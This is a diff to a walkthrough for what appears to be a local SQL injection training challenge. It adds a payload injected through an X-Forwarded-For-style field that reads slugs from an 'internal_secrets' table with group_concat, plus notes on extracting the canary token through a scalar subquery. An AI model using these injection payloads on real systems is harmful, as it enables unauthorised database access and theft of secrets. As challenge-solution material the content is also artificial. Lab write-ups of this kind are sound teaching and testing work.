@@ -172,9 +172,21 @@ curl -X POST http://localhost:3000/api/tracking \
 CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
 ```
 
-One row per injection challenge, each keyed by the challenge slug.
+The schema names a `slug` column but says nothing about its values. Read those rather than guessing them:
+
+```
+1.2.3.4', (SELECT group_concat(slug) FROM internal_secrets), '/x', NULL, datetime('now'))--
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
 
 ### Step 4: Exfiltrate the canary
+
+This endpoint only looks for its own token, so ask for the `x-forwarded-for-sql-injection` row:
 
 ```bash
 curl -X POST http://localhost:3000/api/tracking \
@@ -199,6 +211,8 @@ curl -X POST http://localhost:3000/api/tracking \
 ```
 
 The token is generated at seed time, so it differs on every instance: the only way to produce it is to read it out of the database.
+
+Unlike the `UNION` challenges, the `WHERE` matters here. This sink takes a scalar subquery, and a scalar subquery yields a single value: `(SELECT token FROM internal_secrets)` returns the first row only, which belongs to another challenge. Name the slug, or wrap the column in `group_concat` to bring every token back at once.
 
 The flag is:
 
